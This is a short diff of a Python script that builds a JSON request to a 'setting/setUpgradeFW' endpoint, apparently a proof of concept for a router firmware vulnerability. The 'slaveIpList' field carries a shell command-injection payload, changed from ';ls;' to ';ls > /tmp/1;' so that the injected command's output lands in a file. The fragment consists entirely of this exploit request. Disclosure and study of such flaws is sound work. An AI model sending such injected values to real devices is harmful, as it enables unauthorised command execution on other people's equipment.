@@ -33,7 +33,7 @@ import json
 data = {
     "topicurl": "setting/setUpgradeFW",
     "FileName": "1.txt",
-    "slaveIpList": " \";ls; \" "
+    "slaveIpList": " \";ls > /tmp/1; \" "
 }
 
 data = json.dumps(data)
